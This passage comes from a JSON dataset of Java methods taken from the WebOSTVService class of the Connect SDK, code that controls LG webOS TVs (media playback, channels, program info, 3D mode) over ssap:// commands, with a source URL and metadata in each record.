"MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34683, "method_name": "getMediaControlCapabilityLevel", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CapabilityPriorityLevel", "snippet": "    public CapabilityPriorityLevel getMediaControlCapabilityLevel() {\n        return CapabilityPriorityLevel.HIGH;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34684, "method_name": "play", "class_name": "WebOSTVService", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void play(ResponseListener<Object> listener) {\n        String uri = \"ssap://media.controls/play\";\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, null, true, listener);\n\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34685, "method_name": "pause", "class_name": "WebOSTVService", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void pause(ResponseListener<Object> listener) {\n        String uri = \"ssap://media.controls/pause\";\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, null, true, listener);\n\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34686, "method_name": "stop", "class_name": "WebOSTVService", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void stop(ResponseListener<Object> listener) {\n        String uri = \"ssap://media.controls/stop\";\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, null, true, listener);\n\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34687, "method_name": "rewind", "class_name": "WebOSTVService", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void rewind(ResponseListener<Object> listener) {\n        String uri = \"ssap://media.controls/rewind\";\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, null, true, listener);\n\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34688, "method_name": "fastForward", "class_name": "WebOSTVService", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void fastForward(ResponseListener<Object> listener) {\n        String uri = \"ssap://media.controls/fastForward\";\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, null, true, listener);\n\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34689, "method_name": "previous", "class_name": "WebOSTVService", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void previous(ResponseListener<Object> listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34690, "method_name": "next", "class_name": "WebOSTVService", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void next(ResponseListener<Object> listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34691, "method_name": "seek", "class_name": "WebOSTVService", "params": ["long", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void seek(long position, ResponseListener<Object> listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34692, "method_name": "getDuration", "class_name": "WebOSTVService", "params": ["DurationListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getDuration(DurationListener listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34693, "method_name": "getPosition", "class_name": "WebOSTVService", "params": ["PositionListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getPosition(PositionListener listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34694, "method_name": "getTVControl", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TVControl", "snippet": "    public TVControl getTVControl() {\n        return this;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34695, "method_name": "getTVControlCapabilityLevel", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "CapabilityPriorityLevel", "snippet": "    public CapabilityPriorityLevel getTVControlCapabilityLevel() {\n        return CapabilityPriorityLevel.HIGH;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34696, "method_name": "channelUp", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void channelUp() {\n        channelUp(null);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34697, "method_name": "channelUp", "class_name": "WebOSTVService", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void channelUp(ResponseListener<Object> listener) {\n        String uri = \"ssap://tv/channelUp\";\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, null, true, listener);\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34698, "method_name": "channelDown", "class_name": "WebOSTVService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void channelDown() {\n        channelDown(null);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34699, "method_name": "channelDown", "class_name": "WebOSTVService", "params": ["ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void channelDown(ResponseListener<Object> listener) {\n        String uri = \"ssap://tv/channelDown\";\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, null, true, listener);\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34700, "method_name": "setChannel", "class_name": "WebOSTVService", "params": ["ChannelInfo", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setChannel(ChannelInfo channelInfo, ResponseListener<Object> listener) {\n        String uri = \"ssap://tv/openChannel\";\n        JSONObject payload = new JSONObject();\n\n        try {\n            payload.put(\"channelNumber\", channelInfo.getNumber());\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, payload, true, listener);\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34701, "method_name": "setChannelById", "class_name": "WebOSTVService", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setChannelById(String channelId) {\n        setChannelById(channelId, null);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34702, "method_name": "setChannelById", "class_name": "WebOSTVService", "params": ["String", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setChannelById(String channelId, ResponseListener<Object> listener) {\n        String uri = \"ssap://tv/openChannel\";\n        JSONObject payload = new JSONObject();\n\n        try {\n            payload.put(\"channelId\", channelId);\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, payload, true, listener);\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34703, "method_name": "getCurrentChannel", "class_name": "WebOSTVService", "params": ["boolean", "ChannelListener"], "throws": null, "modifiers": ["private"], "return_type": "ServiceCommand<ResponseListener>", "snippet": "    private ServiceCommand<ResponseListener<Object>> getCurrentChannel(boolean isSubscription, final ChannelListener listener) {\n        ServiceCommand<ResponseListener<Object>> request;\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(Object response) {\n                JSONObject jsonObj = (JSONObject) response;\n                ChannelInfo channel = parseRawChannelData(jsonObj);\n\n                Util.postSuccess(listener, channel);\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        };\n\n        if (isSubscription) {\n            request = new URLServiceSubscription<ResponseListener<Object>>(this, CHANNEL, null, true, responseListener);\n        }\n        else\n            request = new ServiceCommand<ResponseListener<Object>>(this, CHANNEL, null, true, responseListener);\n\n        request.send();\n\n        return request;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34704, "method_name": "getCurrentChannel", "class_name": "WebOSTVService", "params": ["ChannelListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getCurrentChannel(ChannelListener listener) {\n        getCurrentChannel(false, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34705, "method_name": "subscribeCurrentChannel", "class_name": "WebOSTVService", "params": ["ChannelListener"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<ChannelListener>", "snippet": "    public ServiceSubscription<ChannelListener> subscribeCurrentChannel(ChannelListener listener) {\n        return (ServiceSubscription<ChannelListener>) getCurrentChannel(true, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34706, "method_name": "getChannelList", "class_name": "WebOSTVService", "params": ["boolean", "ChannelListListener"], "throws": null, "modifiers": ["private"], "return_type": "ServiceCommand<ResponseListener>", "snippet": "    private ServiceCommand<ResponseListener<Object>> getChannelList(boolean isSubscription, final ChannelListListener listener) {\n        ServiceCommand<ResponseListener<Object>> request;\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(Object response) {\n                try {\n                    JSONObject jsonObj = (JSONObject)response;\n                    ArrayList<ChannelInfo> list = new ArrayList<ChannelInfo>();\n\n                    JSONArray array = (JSONArray) jsonObj.get(\"channelList\");\n                    for (int i = 0; i < array.length(); i++) {\n                        JSONObject object = (JSONObject) array.get(i);\n\n                        ChannelInfo channel = parseRawChannelData(object);\n                        list.add(channel);\n                    }\n\n                    Util.postSuccess(listener, list);\n                } catch (JSONException e) {\n                    e.printStackTrace();\n                }\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        };\n\n        if (isSubscription)\n            request = new URLServiceSubscription<ResponseListener<Object>>(this, CHANNEL_LIST, null, true, responseListener);\n        else\n            request = new ServiceCommand<ResponseListener<Object>>(this, CHANNEL_LIST, null, true, responseListener);\n\n        request.send();\n\n        return request;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34707, "method_name": "getChannelList", "class_name": "WebOSTVService", "params": ["ChannelListListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getChannelList(ChannelListListener listener) {\n        getChannelList(false, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34708, "method_name": "subscribeChannelList", "class_name": "WebOSTVService", "params": ["ChannelListListener"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<ChannelListListener>", "snippet": "    public ServiceSubscription<ChannelListListener> subscribeChannelList(final ChannelListListener listener) {\n        return (ServiceSubscription<ChannelListListener>) getChannelList(true, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34709, "method_name": "getChannelCurrentProgramInfo", "class_name": "WebOSTVService", "params": ["boolean", "ProgramInfoListener"], "throws": null, "modifiers": ["private"], "return_type": "ServiceCommand<ResponseListener>", "snippet": "    private ServiceCommand<ResponseListener<Object>> getChannelCurrentProgramInfo(boolean isSubscription, final ProgramInfoListener listener) {\n        String uri =\"ssap://tv/getChannelCurrentProgramInfo\";\n\n        ServiceCommand<ResponseListener<Object>> request;\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(Object response) {\n                JSONObject jsonObj = (JSONObject)response;\n                ProgramInfo programInfo = parseRawProgramInfo(jsonObj);\n\n                Util.postSuccess(listener, programInfo);\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        };\n\n        if (isSubscription)\n            request = new URLServiceSubscription<ResponseListener<Object>>(this, uri, null, true, responseListener);\n        else\n            request = new ServiceCommand<ResponseListener<Object>>(this, uri, null, true, responseListener);\n\n        request.send();\n\n        return request;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34710, "method_name": "getChannelCurrentProgramInfo", "class_name": "WebOSTVService", "params": ["ProgramInfoListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getChannelCurrentProgramInfo(ProgramInfoListener listener) {\n        getChannelCurrentProgramInfo(false, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34711, "method_name": "subscribeChannelCurrentProgramInfo", "class_name": "WebOSTVService", "params": ["ProgramInfoListener"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<ProgramInfoListener>", "snippet": "    public ServiceSubscription<ProgramInfoListener> subscribeChannelCurrentProgramInfo(ProgramInfoListener listener) {\n        return (ServiceSubscription<ProgramInfoListener>) getChannelCurrentProgramInfo(true, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34712, "method_name": "getProgramList", "class_name": "WebOSTVService", "params": ["boolean", "ProgramListListener"], "throws": null, "modifiers": ["private"], "return_type": "ServiceCommand<ResponseListener>", "snippet": "    private ServiceCommand<ResponseListener<Object>> getProgramList(boolean isSubscription, final ProgramListListener listener) {\n        ServiceCommand<ResponseListener<Object>> request;\n\n        ResponseListener<Object> responseListener = new ResponseListener<Object>() {\n\n            @Override\n            public void onSuccess(Object response) {\n                try {\n                    JSONObject jsonObj = (JSONObject)response;\n                    JSONObject jsonChannel = (JSONObject) jsonObj.get(\"channel\");\n                    ChannelInfo channel = parseRawChannelData(jsonChannel);\n                    JSONArray programList = (JSONArray) jsonObj.get(\"programList\");\n\n                    Util.postSuccess(listener, new ProgramList(channel, programList));\n                } catch (JSONException e) {\n                    e.printStackTrace();\n                }\n            }\n\n            @Override\n            public void onError(ServiceCommandError error) {\n                Util.postError(listener, error);\n            }\n        };\n\n        if (isSubscription)\n            request = new URLServiceSubscription<ResponseListener<Object>>(this, PROGRAM, null, true, responseListener);\n        else\n            request = new ServiceCommand<ResponseListener<Object>>(this, PROGRAM, null, true, responseListener);\n\n        request.send();\n\n        return request;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34713, "method_name": "getProgramInfo", "class_name": "WebOSTVService", "params": ["ProgramInfoListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getProgramInfo(ProgramInfoListener listener) {\n        // TODO need to parse current program when program id is correct\n        Util.postError(listener, ServiceCommandError.notSupported());\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34714, "method_name": "subscribeProgramInfo", "class_name": "WebOSTVService", "params": ["ProgramInfoListener"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<ProgramInfoListener>", "snippet": "    public ServiceSubscription<ProgramInfoListener> subscribeProgramInfo(ProgramInfoListener listener) {\n        Util.postError(listener, ServiceCommandError.notSupported());\n\n        return new NotSupportedServiceSubscription<ProgramInfoListener>();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34715, "method_name": "getProgramList", "class_name": "WebOSTVService", "params": ["ProgramListListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void getProgramList(ProgramListListener listener) {\n        getProgramList(false, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34716, "method_name": "subscribeProgramList", "class_name": "WebOSTVService", "params": ["ProgramListListener"], "throws": null, "modifiers": ["public"], "return_type": "ServiceSubscription<ProgramListListener>", "snippet": "    public ServiceSubscription<ProgramListListener> subscribeProgramList(ProgramListListener listener) {\n        return (ServiceSubscription<ProgramListListener>) getProgramList(true, listener);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34717, "method_name": "set3DEnabled", "class_name": "WebOSTVService", "params": ["boolean", "ResponseListener<Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void set3DEnabled(final boolean enabled, final ResponseListener<Object> listener) {\n        String uri; \n        if (enabled)\n            uri = \"ssap://com.webos.service.tv.display/set3DOn\";\n        else\n            uri = \"ssap://com.webos.service.tv.display/set3DOff\";\n\n        ServiceCommand<ResponseListener<Object>> request = new ServiceCommand<ResponseListener<Object>>(this, uri, null, true, listener);\n\n        request.send();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/WebOSTVService.java", "stars": "4", "class_props": {"extends": "DeviceService", "implements": ["Launcher", "MediaControl", "MediaPlayer", "VolumeControl", "TVControl", "ToastControl", "ExternalInputControl", "MouseControl", "TextInputControl", "PowerControl", "KeyControl", "WebAppLauncher", "PlaylistControl"], "modifiers": ["public"]}}, {"id": 34718, "method_name": "get3DEnabled", "class_name": "WebOSTVService", "params": ["boolean", "State3DModeListener"], "throws": null, "modifiers": ["private"], "return_type": "ServiceCommand<State3DModeListener>", "snippet": "    private ServiceCommand<State3DModeListener> 